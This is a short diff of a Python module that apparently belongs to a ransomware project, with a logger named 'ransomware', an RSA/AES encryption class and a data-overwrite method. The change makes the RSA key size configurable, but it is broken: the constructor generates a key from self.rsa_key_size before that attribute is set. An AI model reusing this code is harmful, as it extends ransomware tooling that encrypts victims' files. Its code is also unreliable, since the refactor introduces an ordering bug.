@@ -1,20 +1,25 @@
+import logging
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad
 
-import logging
 
 logger = logging.getLogger("ransomware")
 
 
-RSA_KEY_SIZE = 2048
+RSA_DEFAULT_KEY_SIZE = 2048
 
 
 class RSAAESEncryption:
+    """
+    RSA/AES encryption class
+    """
+
     def __init__(self, private_key: str | None = None, **kwargs) -> None:
         self.private_key = private_key or self._generate_rsa_key()
         self.session_key = get_random_bytes(16)
+        self.rsa_key_size = kwargs.get("rsa_key_size", RSA_DEFAULT_KEY_SIZE)
 
     def _export_key(self):
         """
@@ -28,7 +33,7 @@ class RSAAESEncryption:
         """
         Generate a new RSA key pair
         """
-        return RSA.generate(RSA_KEY_SIZE)
+        return RSA.generate(self.rsa_key_size)
 
     def _overwrite_data(
             self,
